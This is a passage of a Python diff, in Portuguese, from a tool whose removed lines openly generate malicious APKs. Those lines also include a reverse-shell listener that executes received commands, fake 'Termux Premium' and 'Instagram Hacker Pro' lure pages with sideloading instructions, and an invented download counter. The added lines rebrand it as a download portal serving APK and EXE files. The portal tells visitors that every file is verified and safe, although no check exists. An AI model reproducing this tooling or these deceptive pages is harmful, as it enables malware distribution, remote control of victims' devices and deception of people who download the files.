-                    <p>Execução de comandos até 3x mais rápida que versões convencionais.</p>
-                </div>
-                
-                <div class="feature-card">
                     <div class="feature-icon">🔒</div>
-                    <h3>Segurança Avançada</h3>
-                    <p>Proteção contra vulnerabilidades and ataques cibernéticos.</p>
+                    <h3>Segurança Garantida</h3>
+                    <p>Todos os arquivos são verificados e seguros para download.</p>
                 </div>
                 
                 <div class="feature-card">
-                    <div class="feature-icon">🎨</div>
-                    <h3>Interface Premium</h3>
-                    <p>Design moderno com temas personalizáveis e alta usabilidade.</p>
+                    <div class="feature-icon">⚡</div>
+                    <h3>Alta Velocidade</h3>
+                    <p>Downloads rápidos sem limitações de velocidade.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">📱</div>
+                    <h3>Multiplataforma</h3>
+                    <p>Arquivos para Windows, Android, Linux e mais.</p>
                 </div>
             </div>
-        </div>
-    </section>
-
-    <section class="download">
-        <div class="container">
-            <h2>Pronto para Experimentar?</h2>
-            <p>Baixe agora o Termux Premium e descubra uma nova forma de usar o terminal no Android.</p>
-            <a href="/download" class="btn">Baixar Agora</a>
         </div>
     </section>
 
     <footer>
         <div class="container">
-            <p>&copy; 2024 Termux Premium. Todos os direitos reservados.</p>
+            <p>&copy; 2024 {site_title}. Todos os direitos reservados.</p>
         </div>
     </footer>
-
-    <script>
-        // Animação suave para links de navegação
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
-                });
-            });
-        });
-        
-        // Contador de downloads (fictício)
-        let downloadCount = 15423;
-        setInterval(() => {
-            downloadCount++;
-            document.getElementById('download-count').textContent = downloadCount.toLocaleString();
-        }, 5000);
-    </script>
 </body>
 </html>
 """
     
-    def generate_instahacker_site(self):
-        """Gera site fake avançado para Instagram Hacker"""
-        return """
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Hacker Pro - Ferramenta Profissional</title>
-    <style>
-        /* (Estilos similares ao do Termux, mas com cores diferentes) */
-        :root {
-            --primary: #e1306c;
-            --secondary: #c13584;
-            --accent: #405de6;
-            --dark: #262626;
-            --light: #fafafa;
-        }
+    def generate_downloads_page(self):
+        """Gera página de downloads com arquivos reais"""
+        files = self.file_manager.list_uploaded_files()
         
-        body {
-            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
-        }
+        files_html = ""
+        if files:
+            for file_id, file_info in files.items():
+                file_size_mb = file_info['file_size'] / (1024 * 1024)
+                files_html += f"""
+                <div class="file-card">
+                    <div class="file-icon">📄</div>
+                    <div class="file-info">
+                        <h3>{file_info['file_name']}</h3>
+                        <p>Tamanho: {file_size_mb:.2f} MB • Downloads: {file_info['download_count']}</p>
+                        <p>Upload: {file_info['upload_time']}</p>
+                    </div>
+                    <a href="/download/{file_id}" class="download-btn">Download</a>
+                </div>
+                """
+        else:
+            files_html = "<p class='no-files'>Nenhum arquivo disponível para download.</p>"
         
-        /* Resto do CSS similar ao do Termux com ajustes de cores */
-    </style>
-</head>
-<body>
-    <!-- Estrutura HTML similar à do Termux com conteúdo específico do Instagram Hacker -->
-</body>
-</html>
-"""
-    
-    def generate_download_page(self):
-        """Gera página de download"""
         return f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download - {self.apk_name}</title>
+    <title>Downloads - {self.site_config.get('title', 'Portal de Downloads')}</title>
     <style>
         body {{
             font-family: Arial, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 80px 20px 20px;
             background: #f5f5f5;
         }}
+        
         .container {{
             max-width: 800px;
             margin: 0 auto;
+        }}
+        
+        .page-title {{
+            text-align: center;
+            color: #333;
+            margin-bottom: 40px;
+        }}
+        
+        .files-list {{
             background: white;
-            padding: 30px;
             border-radius: 10px;
+            padding: 30px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }}
-        h1 {{
-            color: #333;
-            text-align: center;
-        }}
-        .btn {{
-            display: block;
-            width: 200px;
-            margin: 20px auto;
-            padding: 15px;
-            background: #007bff;
-            color: white;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-        }}
-        .btn:hover {{
-            background: #0056b3;
-        }}
-        .instructions {{
-            background: #f8f9fa;
+        
+        .file-card {{
+            display: flex;
+            align-items: center;
             padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            transition: background 0.3s;
+        }}
+        
+        .file-card:hover {{
+            background: #f8f9fa;
+        }}
+        
+        .file-icon {{
+            font-size: 32px;
+            margin-right: 20px;
+        }}
+        
+        .file-info {{
+            flex: 1;
+        }}
+        
+        .file-info h3 {{
+            margin: 0 0 5px 0;
+            color: #333;
+        }}
+        
+        .file-info p {{
+            margin: 0;
+            color: #666;
+            font-size: 14px;
+        }}
+        
+        .download-btn {{
+            background: #2196F3;
+            color: white;
+            padding: 10px 20px;
             border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background 0.3s;
+        }}
+        
+        .download-btn:hover {{
+            background: #1976D2;
+        }}
+        
+        .no-files {{
+            text-align: center;
+            color: #666;
+            font-style: italic;
+            padding: 40px;
+        }}
+        
+        .back-link {{
+            display: inline-block;
             margin-top: 20px;
+            color: #2196F3;
+            text-decoration: none;
         }}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Download {self.apk_name}</h1>
-        <p>Clique no botão abaixo para baixar o aplicativo:</p>
-        <a href="/download-apk" class="btn">Baixar APK</a>
+        <h1 class="page-title">Downloads Disponíveis</h1>
         
-        <div class="instructions">
-            <h2>Instruções de Instalação:</h2>
-            <ol>
-                <li>Baixe o arquivo APK acima</li>
-                <li>Vá para Configurações > Segurança</li>
-                <li>Ative "Fontes desconhecidas"</li>
-                <li>Instale o aplicativo baixado</li>
-                <li>Abra o aplicativo e aproveite!</li>
-            </ol>
+        <div class="files-list">
+            {files_html}
         </div>
+        
+        <a href="/" class="back-link">← Voltar à Página Principal</a>
+    </div>
+</body>
+</html>
+"""
+    
+    def generate_about_page(self):
+        """Gera página sobre"""
+        return """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sobre - Portal de Downloads</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 80px 20px 20px;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        p {
+            line-height: 1.6;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: #2196F3;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sobre o Portal de Downloads</h1>
+        
+        <p>Este é um portal seguro para distribuição de arquivos e aplicativos. 
+        Todos os arquivos disponíveis para download passam por verificações de segurança 
+        para garantir a proteção dos nossos usuários.</p>
+        
+        <p><strong>Recursos:</strong></p>
+        <ul>
+            <li>Downloads seguros e verificados</li>
+            <li>Suporte a múltiplas plataformas</li>
+            <li>Alta velocidade de download</li>
+            <li>Interface amigável e responsiva</li>
+        </ul>
+        
+        <a href="/" class="back-link">← Voltar à Página Principal</a>
+    </div>
+</body>
+</html>
+"""
+    
+    def generate_stats_page(self):
+        """Gera página de estatísticas"""
+        files = self.file_manager.list_uploaded_files()
+        total_downloads = sum(file_info['download_count'] for file_info in files.values())
+        total_files = len(files)
+        
+        return f"""
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Estatísticas - Portal de Downloads</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 80px 20px 20px;
+            background: #f5f5f5;
+        }}
+        
+        .container {{
+            max-width: 800px;
+            margin: 0 auto;
+        }}
+        
+        .stats-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }}
+        
+        .stat-card {{
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        
+        .stat-number {{
+            font-size: 36px;
+            font-weight: bold;
+            color: #2196F3;
+            margin-bottom: 10px;
+        }}
+        
+        .stat-label {{
+            color: #666;
+            font-size: 14px;
+        }}
+        
+        .files-list {{
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        
+        .file-stat {{
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }}
+        
+        .back-link {{
+            display: inline-block;
+            margin-top: 20px;
+            color: #2196F3;
+            text-decoration: none;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Estatísticas do Portal</h1>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">{total_files}</div>
+                <div class="stat-label">Arquivos Disponíveis</div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-number">{total_downloads}</div>
+                <div class="stat-label">Total de Downloads</div>
+            </div>
+        </div>
+        
+        <div class="files-list">
+            <h2>Estatísticas por Arquivo</h2>
+            {"".join(f'<div class="file-stat"><span>{info["file_name"]}</span><span>{info["download_count"]} downloads</span></div>' 
+                    for info in files.values())}
+        </div>
+        
+        <a href="/" class="back-link">← Voltar à Página Principal</a>
     </div>
 </body>
 </html>
 """
 
-# ==================== SHELL REVERSO AVANÇADO ====================
-class AdvancedReverseShellManager:
-    def __init__(self):
-        self.active_connections = {}
-    
-    def start_advanced_listener(self, port):
-        """Inicia um listener avançado para shell reverso"""
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.bind(('0.0.0.0', port))
-                s.listen(5)
-                console.print(f"[green]👂 Ouvindo na porta {port}...[/green]")
-                
-                while True:
-                    conn, addr = s.accept()
-                    console.print(f"[green]✅ Conexão recebida de {addr}[/green]")
-                    
-                    # Registrar conexão
-                    conn_id = f"{addr[0]}:{addr[1]}"
-                    self.active_connections[conn_id] = {
-                        "conn": conn,
-                        "address": addr,
-                        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    }
-                    
-                    # Iniciar thread para lidar com a conexão
-                    client_thread = threading.Thread(
-                        target=self.handle_advanced_client,
-                        args=(conn, addr)
-                    )
-                    client_thread.daemon = True
-                    client_thread.start()
-                    
-        except Exception as e:
-            console.print(f"[red]❌ Erro no listener: {e}[/red]")
-    
-    def handle_advanced_client(self, conn, addr):
-        """Lida com uma conexão de cliente de forma avançada"""
-        try:
-            conn.sendall(b"Advanced Reverse Shell Connected!\n")
-            
-            while True:
-                # Enviar prompt personalizado
-                conn.sendall(b"\nadvanced-shell> ")
-                
-                # Receber comando
-                data = conn.recv(1024).decode().strip()
-                if not data:
-                    break
-                
-                console.print(f"[cyan]📨 Comando de {addr}: {data}[/cyan]")
-                
-                # Comandos especiais
-                if data.lower() == "screenshot":
-                    self.handle_screenshot_command(conn)
-                    continue
-                elif data.lower() == "download":
-                    self.handle_download_command(conn)
-                    continue
-                elif data.lower() in ["exit", "quit"]:
-                    conn.sendall(b"Saindo...\n")
-                    break
-                elif data.lower() == "help":
-                    self.show_help(conn)
-                    continue
-                
-                # Executar comando normal
-                try:
-                    result = subprocess.run(
-                        data, 
-                        shell=True, 
-                        capture_output=True, 
-                        text=True, 
-                        timeout=30
-                    )
-                    output = result.stdout + result.stderr
-                    if not output:
-                        output = "Comando executado (sem saída)\n"
-                except subprocess.TimeoutExpired:
-                    output = "Erro: Comando expirado (timeout)\n"
-                except Exception as e:
-                    output = f"Erro executando comando: {e}\n"
-                
-                # Enviar resultado
-                conn.sendall(output.encode())
-                
-        except Exception as e:
-            console.print(f"[red]❌ Erro com cliente {addr}: {e}[/red]")
-        finally:
-            conn.close()
-            console.print(f"[yellow]🔌 Conexão fechada com {addr}[/yellow]")
-            
-            # Remover das conexões ativas
-            conn_id = f"{addr[0]}:{addr[1]}"
-            if conn_id in self.active_connections:
-                del self.active_connections[conn_id]
-    
-    def handle_screenshot_command(self, conn):
-        """Lida com comando de screenshot (simulado)"""
-        try:
-            # Simular screenshot
-            conn.sendall(f"[INFO] Comando screenshot não disponível nesta versão\n".encode())
-        except Exception as e:
-            conn.sendall(f"[ERRO] Falha no screenshot: {e}\n".encode())
-    
-    def handle_download_command(self, conn):
-        """Lida com comando de download (simulado)"""
-        try:
-            conn.sendall(f"[INFO] Especifique o arquivo para download: download <arquivo>\n".encode())
-        except Exception as e:
-            conn.sendall(f"[ERRO] Falha no download: {e}\n".encode())
-    
-    def show_help(self, conn):
-        """Mostra ajuda de comandos"""
-        help_text = """
-Comandos disponíveis:
-- help: Mostra esta ajuda
-- screenshot: Tira screenshot da tela (não disponível)
-- download <arquivo>: Download de arquivo (não disponível)
-- exit/quit: Sair do shell
-
-Comandos normais do sistema também estão disponíveis.
-"""
-        conn.sendall(help_text.encode())
-
 # ==================== PAINEL PRINCIPAL AVANÇADO ====================
-class AdvancedMalwareGeneratorPanel:
+class AdvancedFileServerPanel:
     def __init__(self):
-        self.apk_generator = AdvancedAPKGenerator()
-        self.shell_manager = AdvancedReverseShellManager()
+        self.file_manager = RealFileManager()
         self.server = None
         self.server_thread = None
+        self.server_port = 8080
+        self.site_config = {
+            'title': 'Portal de Downloads Premium',
+            'description': 'Downloads seguros para todas as plataformas'
+        }
         
         self.banner = """
-[bold red]
-    ╔═╗┌─┐┬  ┌─┐┌┬┐┬┌┐┌┌─┐  ╔═╗┌─┐┌─┐┬ ┬  ╔═╗┬┌┬┐┌─┐  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
-    ╠═╝├─┤│  │ │ │ │││││ │  ╠═╝├─┤│  ├─┤  ║ ║│ │ │ │  ║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
-    ╩  ┴ ┴┴─┘└─┘ ┴ ┴┘└┘└─┘  ╩  ┴ ┴└─┘┴ ┴  ╚═╝┴ ┴ └─┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
-[/bold red]
-[bold white on red]        GERADOR DE APKs MALICIOSOS AVANÇADOS - v4.0[/bold white on red]
+[bold blue]
+    ╔═╗┌─┐┬  ┌─┐┌┬┐┬┌┐┌┌─┐  ╔═╗┌─┐┬─┐┌─┐┬ ┬  ╔═╗┌─┐┌┬┐┌─┐┬─┐
+    ╠═╝├─┤│  │ │ │ │││││ │  ║  │ │├┬┘├─┤├─┤  ╠═╝├─┤ │ ├┤ ├┬┘
+    ╩  ┴ ┴┴─┘└─┘ ┴ ┴┘└┘└─┘  ╚═╝└─┘┴└─┴ ┴┴ ┴  ╩  ┴ ┴ ┴ └─┘┴└─
+[/bold blue]
+[bold white on blue]        SERVIDOR DE ARQUIVOS REAIS - DISTRIBUIÇÃO PROFISSIONAL[/bold white on blue]
 """
     
     def show_menu(self):
-        """Mostra o menu principal avançado"""
+        """Mostra o menu principal"""
         while True:
             console.clear()
             console.print(self.banner)
             
             # Status do servidor
-            status_text = "[cyan]🌐 Servidor:[/cyan] Parado\n[cyan]👂 Listener:[/cyan] Parado"
-            if self.server:
-                status_text = f"[cyan]🌐 Servidor:[/cyan] Rodando\n[cyan]👂 Listener:[/cyan] Parado"
+            server_status = "[red]❌ PARADO[/red]" if not self.server else "[green]✅ RODANDO[/green]"
+            files_count = len(self.file_manager.list_uploaded_files())
             
             status_panel = Panel.fit(
-                status_text,
-                title="[bold]Status[/bold]",
+                f"[cyan]🌐 Servidor:[/cyan] {server_status}\n"
+                f"[cyan]📂 Arquivos:[/cyan] {files_count} carregados\n"
+                f"[cyan]🔌 Porta:[/cyan] {self.server_port}",
+                title="[bold]Status do Sistema[/bold]",
                 border_style="blue"
             )
             console.print(status_panel)
             
             table = Table(
-                title="[bold cyan]🎭 MENU PRINCIPAL AVANçADO[/bold cyan]",
+                title="[bold cyan]🎛️  MENU PRINCIPAL[/bold cyan]",
                 show_header=True,
                 header_style="bold magenta"
             )
@@ -1177,11 +894,11 @@ class AdvancedMalwareGeneratorPanel:
             table.add_column("Descrição", style="green")
             table.add_column("Status", style="yellow")
             
-            table.add_row("1", "Gerar APK Malicioso Avançado", "📱")
-            table.add_row("2", "Iniciar Servidor Web Profissional", "🌐")
-            table.add_row("3", "Iniciar Listener Shell Avançado", "👂")
-            table.add_row("4", "Gerenciar APKs Gerados", "📂")
-            table.add_row("5", "Configurações Avançadas", "⚙️")
+            table.add_row("1", "Carregar Arquivo Real", "📁")
+            table.add_row("2", "Iniciar Servidor Web", "🌐")
+            table.add_row("3", "Gerenciar Arquivos", "📊")
+            table.add_row("4", "Configurar Site", "⚙️")
+            table.add_row("5", "Estatísticas", "📈")
             table.add_row("0", "Sair", "🚪")
             
             console.print(table)
@@ -1193,134 +910,133 @@ class AdvancedMalwareGeneratorPanel:
             )
             
             if choice == "1":
-                self.generate_advanced_malicious_apk()
+                self.upload_real_file()
             elif choice == "2":
-                self.start_advanced_web_server()
+                self.start_real_web_server()
             elif choice == "3":
-                self.start_advanced_shell_listener()
+                self.manage_files()
             elif choice == "4":
-                self.manage_generated_apks()
+                self.configure_site()
             elif choice == "5":
-                self.show_advanced_settings()
+                self.show_statistics()
             elif choice == "0":
                 self.exit_program()
     
-    def generate_advanced_malicious_apk(self):
-        """Gera um APK malicioso avançado"""
+    def upload_real_file(self):
+        """Carrega um arquivo real para distribuição"""
         console.print(Panel.fit(
-            "[bold]📱 GERADOR DE APK MALICIOSO AVANÇADO[/bold]",
+            "[bold]📁 CARREGAR ARQUIVO REAL[/bold]",
             border_style="blue"
         ))
         
-        apk_type = Prompt.ask(
-            "[yellow]?[/yellow] Tipo de APK",
-            choices=["termux", "instahacker"],
-            default="termux"
-        )
+        while True:
+            file_path = Prompt.ask(
+                "[yellow]?[/yellow] Caminho completo do arquivo",
+                default=""
+            )
+            
+            if not file_path:
+                if Confirm.ask("[yellow]?[/yellow] Cancelar operação?"):
+                    return
+            
+            # Expandir ~ para home directory
+            file_path = os.path.expanduser(file_path)
+            
+            # Validar arquivo
+            is_valid, message = self.file_manager.validate_file(file_path)
+            if is_valid:
+                break
+            else:
+                console.print(f"[red]❌ {message}[/red]")
+                if not Confirm.ask("[yellow]?[/yellow] Tentar outro arquivo?"):
+                    return
         
-        lhost = Prompt.ask(
-            "[yellow]?[/yellow] IP para conexão reversa",
-            default=socket.gethostbyname(socket.gethostname())
-        )
-        
-        lport = IntPrompt.ask(
-            "[yellow]?[/yellow] Porta para conexão",
-            default=4444
-        )
-        
-        output_name = Prompt.ask(
-            "[yellow]?[/yellow] Nome do arquivo de saída (opcional)",
+        # Perguntar por nome personalizado
+        custom_name = Prompt.ask(
+            "[yellow]?[/yellow] Nome personalizado (opcional)",
             default=""
         )
         
-        if not output_name:
-            output_name = None
+        if not custom_name:
+            custom_name = None
         
-        console.print("[yellow]⏳ Gerando APK malicioso avançado...[/yellow]")
+        console.print("[yellow]⏳ Copiando arquivo para o servidor...[/yellow]")
         
         with Progress() as progress:
-            task = progress.add_task("[cyan]Criando APK...", total=100)
+            task = progress.add_task("[cyan]Processando...", total=100)
             
             for i in range(100):
-                time.sleep(0.05)
+                time.sleep(0.02)
                 progress.update(task, advance=1)
         
-        apk_path = self.apk_generator.generate_advanced_apk(
-            apk_type, lhost, lport, output_name
-        )
+        # Copiar arquivo
+        file_id, message = self.file_manager.copy_file_to_server(file_path, custom_name)
         
-        if apk_path:
-            # Perguntar se quer iniciar o servidor web
-            if Confirm.ask("[yellow]?[/yellow] Iniciar servidor web para distribuição?"):
-                self.start_advanced_web_server(apk_type, apk_path)
+        if file_id:
+            file_info = self.file_manager.get_file_info(file_id)
+            console.print(Panel.fit(
+                f"[green]✅ Arquivo carregado com sucesso![/green]\n"
+                f"[cyan]Nome:[/cyan] {file_info['file_name']}\n"
+                f"[cyan]Tamanho:[/cyan] {file_info['file_size'] / 1024 / 1024:.2f} MB\n"
+                f"[cyan]ID:[/cyan] {file_id}\n"
+                f"[yellow]⚠️ Pronto para distribuição via servidor web[/yellow]",
+                title="[green]SUCESSO[/green]",
+                border_style="green"
+            ))
+        else:
+            console.print(f"[red]❌ {message}[/red]")
         
         input("\nPressione Enter para voltar...")
     
-    def start_advanced_web_server(self, apk_type=None, apk_path=None):
-        """Inicia o servidor web avançado para distribuição"""
+    def start_real_web_server(self):
+        """Inicia servidor web real para distribuição"""
         console.print(Panel.fit(
-            "[bold]🌐 SERVIDOR WEB PROFISSIONAL[/bold]",
+            "[bold]🌐 SERVIDOR WEB REAL[/bold]",
             border_style="blue"
         ))
         
-        if not apk_type:
-            apk_type = Prompt.ask(
-                "[yellow]?[/yellow] Tipo de APK para servir",
-                choices=["termux", "instahacker"],
-                default="termux"
-            )
+        # Verificar se há arquivos carregados
+        if not self.file_manager.list_uploaded_files():
+            console.print("[red]❌ Nenhum arquivo carregado. Carregue arquivos primeiro.[/red]")
+            input("\nPressione Enter para voltar...")
+            return
         
-        if not apk_path:
-            # Procurar APK mais recente do tipo especificado
-            apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) 
-                        if f.startswith(apk_type) and f.endswith('.apk')]
-            
-            if apk_files:
-                apk_files.sort(key=lambda x: os.path.getmtime(os.path.join(APK_OUTPUT_DIR, x)), reverse=True)
-                apk_path = os.path.join(APK_OUTPUT_DIR, apk_files[0])
-                console.print(f"[yellow]⚠️ Usando APK mais recente: {apk_path}[/yellow]")
-            else:
-                console.print("[red]❌ Nenhum APK encontrado. Gere um APK primeiro.[/red]")
-                input("\nPressione Enter para voltar...")
-                return
-        
-        port = IntPrompt.ask(
-            "[yellow]?[/yellow] Porta do servidor web",
-            default=8080
+        # Configurar porta
+        self.server_port = IntPrompt.ask(
+            "[yellow]?[/yellow] Porta do servidor",
+            default=self.server_port
         )
         
         # Verificar se porta está disponível
-        try:
-            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_socket.bind(('0.0.0.0', port))
-            test_socket.close()
-        except:
-            console.print("[red]❌ Porta já em uso![/red]")
+        if not self.check_port_available(self.server_port):
+            console.print("[red]❌ Porta já em uso! Escolha outra porta.[/red]")
             input("\nPressione Enter para voltar...")
             return
         
         # Iniciar servidor
         try:
-            # Obter nome do APK para exibição
-            apk_name = self.apk_generator.templates[apk_type]['name']
-            
-            # Criar handler personalizado
             def handler(*args):
-                AdvancedFakeSiteHandler(*args, apk_type=apk_type, apk_path=apk_path, apk_name=apk_name)
+                RealFileServerHandler(*args, 
+                                   file_manager=self.file_manager,
+                                   site_config=self.site_config)
             
-            self.server = HTTPServer(('0.0.0.0', port), handler)
+            self.server = HTTPServer(('0.0.0.0', self.server_port), handler)
             
             # Iniciar em thread separada
             self.server_thread = threading.Thread(target=self.server.serve_forever)
             self.server_thread.daemon = True
             self.server_thread.start()
             
+            # Obter IP local
+            local_ip = self.get_local_ip()
+            
             console.print(Panel.fit(
-                f"[green]✅ Servidor web profissional iniciado![/green]\n"
-                f"[cyan]URL: http://0.0.0.0:{port}[/cyan]\n"
-                f"[cyan]Tipo: {apk_type}[/cyan]\n"
-                f"[cyan]APK: {apk_path}[/cyan]\n"
-                f"[yellow]⚠️ Site completo com CSS, JS e HTML profissional[/yellow]",
+                f"[green]✅ Servidor web iniciado com sucesso![/green]\n"
+                f"[cyan]URL Local:[/cyan] http://localhost:{self.server_port}\n"
+                f"[cyan]URL Rede:[/cyan] http://{local_ip}:{self.server_port}\n"
+                f"[cyan]Arquivos:[/cyan] {len(self.file_manager.list_uploaded_files())} disponíveis\n"
+                f"[yellow]⚠️ Site profissional com HTML/CSS real[/yellow]\n"
+                f"[yellow]⚠️ Suporte total a APK, EXE, PY e outros[/yellow]",
                 title="[green]SERVIDOR ATIVO[/green]",
                 border_style="green"
             ))
@@ -1340,167 +1056,151 @@ class AdvancedMalwareGeneratorPanel:
         
         input("\nPressione Enter para voltar...")
     
-    def start_advanced_shell_listener(self):
-        """Inicia listener avançado para shell reverso"""
+    def manage_files(self):
+        """Gerencia arquivos carregados"""
         console.print(Panel.fit(
-            "[bold]👂 LISTENER SHELL REVERSO AVANÇADO[/bold]",
+            "[bold]📊 GERENCIAR ARQUIVOS[/bold]",
             border_style="blue"
         ))
         
-        port = IntPrompt.ask(
-            "[yellow]?[/yellow] Porta para escutar",
-            default=4444
-        )
+        files = self.file_manager.list_uploaded_files()
         
-        # Verificar se porta está disponível
-        try:
-            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_socket.bind(('0.0.0.0', port))
-            test_socket.close()
-        except:
-            console.print("[red]❌ Porta já em uso![/red]")
+        if not files:
+            console.print("[yellow]⚠️ Nenhum arquivo carregado.[/yellow]")
             input("\nPressione Enter para voltar...")
             return
         
-        console.print(f"[yellow]⚠️ Iniciando listener avançado na porta {port}...[/yellow]")
-        console.print("[yellow]⚠️ Pressione Ctrl+C para parar[/yellow]")
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("ID", style="cyan", width=10)
+        table.add_column("Nome", style="green")
+        table.add_column("Tamanho", style="yellow")
+        table.add_column("Downloads", style="blue")
+        table.add_column("Upload", style="white")
         
-        try:
-            # Iniciar listener em thread separada
-            listener_thread = threading.Thread(
-                target=self.shell_manager.start_advanced_listener,
-                args=(port,)
+        for file_id, file_info in files.items():
+            file_size_mb = file_info['file_size'] / (1024 * 1024)
+            table.add_row(
+                file_id,
+                file_info['file_name'],
+                f"{file_size_mb:.2f} MB",
+                str(file_info['download_count']),
+                file_info['upload_time']
             )
-            listener_thread.daemon = True
-            listener_thread.start()
-            
-            # Manter thread principal ativa
-            while listener_thread.is_alive():
-                time.sleep(1)
-                
-        except KeyboardInterrupt:
-            console.print("\n[yellow]⏹️ Listener interrompido[/yellow]")
-        except Exception as e:
-            console.print(f"[red]❌ Erro no listener: {e}[/red]")
-        
-        input("\nPressione Enter para voltar...")
-    
-    def manage_generated_apks(self):
-        """Mostra APKs gerados"""
-        console.print(Panel.fit(
-            "[bold]📂 APKs GERADOS[/bold]",
-            border_style="blue"
-        ))
-        
-        apk_files = [f for f in os.listdir(APK_OUTPUT_DIR) if f.endswith('.apk')]
-        
-        if not apk_files:
-            console.print("[yellow]⚠️ Nenhum APK gerado ainda.[/yellow]")
-            input("\nPressione Enter para voltar...")
-            return
-        
-        table = Table(show_header=True, header_style="bold magenta")
-        table.add_column("Nome", style="cyan")
-        table.add_column("Tamanho", style="green")
-        table.add_column("Modificado", style="yellow")
-        table.add_column("Tipo", style="blue")
-        
-        for apk_file in apk_files:
-            apk_path = os.path.join(APK_OUTPUT_DIR, apk_file)
-            file_size = os.path.getsize(apk_path)
-            mod_time = datetime.fromtimestamp(os.path.getmtime(apk_path)).strftime("%Y-%m-%d %H:%M")
-            
-            # Determinar tipo
-            apk_type = "Termux" if "termux" in apk_file.lower() else "InstaHacker"
-            
-            table.add_row(apk_file, f"{file_size/1024:.1f} KB", mod_time, apk_type)
         
         console.print(table)
-        input("\nPressione Enter para voltar...")
-    
-    def show_advanced_settings(self):
-        """Mostra configurações avançadas"""
-        console.print(Panel.fit(
-            "[bold]⚙️ CONFIGURAÇÕES AVANÇADAS[/bold]",
-            border_style="blue"
-        ))
         
-        table = Table(show_header=True, header_style="bold magenta")
-        table.add_column("Opção", style="cyan")
-        table.add_column("Descrição", style="green")
-        table.add_column("Status", style="yellow")
-        
-        table.add_row("1", "Configurar Template Termux", "📝")
-        table.add_row("2", "Configurar Template Instagram Hacker", "📝")
-        table.add_row("3", "Gerenciar Portas Padrão", "🔌")
-        table.add_row("4", "Configurar Auto-Inicialização", "🔧")
-        
-        console.print(table)
+        # Opções de gerenciamento
+        console.print("\n[bold]Opções:[/bold]")
+        console.print("[1] Remover arquivo")
+        console.print("[2] Voltar")
         
         choice = Prompt.ask(
-            "[blink yellow]➤[/blink yellow] Selecione uma opção",
-            choices=["1", "2", "3", "4", "0"],
+            "[blink yellow]➤[/blink yellow] Selecione",
+            choices=["1", "2"],
             show_choices=False
         )
         
         if choice == "1":
-            self.configure_termux_template()
-        elif choice == "2":
-            self.configure_instahacker_template()
-        elif choice == "3":
-            self.configure_ports()
-        elif choice == "4":
-            self.configure_autostart()
+            file_id = Prompt.ask("[yellow]?[/yellow] ID do arquivo para remover")
+            if file_id in files:
+                success, message = self.file_manager.delete_file(file_id)
+                if success:
+                    console.print(f"[green]✅ {message}[/green]")
+                else:
+                    console.print(f"[red]❌ {message}[/red]")
+            else:
+                console.print("[red]❌ ID inválido[/red]")
+            
+            input("\nPressione Enter para voltar...")
+    
+    def configure_site(self):
+        """Configura o site do servidor"""
+        console.print(Panel.fit(
+            "[bold]⚙️ CONFIGURAR SITE[/bold]",
+            border_style="blue"
+        ))
+        
+        console.print(f"[cyan]Configuração atual:[/cyan]")
+        console.print(f"Título: {self.site_config['title']}")
+        console.print(f"Descrição: {self.site_config['description']}")
+        
+        new_title = Prompt.ask(
+            "[yellow]?[/yellow] Novo título",
+            default=self.site_config['title']
+        )
+        
